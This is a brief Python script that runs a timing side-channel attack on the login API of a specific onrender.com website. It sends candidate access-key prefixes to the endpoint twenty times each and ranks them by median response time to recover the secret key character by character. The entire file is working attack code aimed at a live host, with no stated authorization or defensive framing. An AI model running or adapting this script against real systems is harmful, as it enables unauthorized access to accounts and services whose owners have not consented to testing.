import requests
import time
import statistics

BASE_URL = "https://website2-zxj5.onrender.com"
AUTH_API = f"{BASE_URL}/api/auth/login"
session = requests.Session()

# The top 3 candidates we've seen so far for the first 3 characters
candidates = ["4fd", "4fa", "47a", "4fe"] 

print("[*] Running Deep Verification (20 iterations each)...")

results = {}
for cand in candidates:
    times = []
    for _ in range(20):
        start = time.perf_counter()
        try:
            session.post(AUTH_API, json={"accessKey": cand}, timeout=5)
            times.append(time.perf_counter() - start)
        except: pass
    
    med = statistics.median(times)
    results[cand] = med
    print(f" Candidate '{cand}': {med:.4f}s")

winner = max(results, key=results.get)
print(f"\n[!] Strongest Lead: {winner} ({results[winner]:.4f}s)")
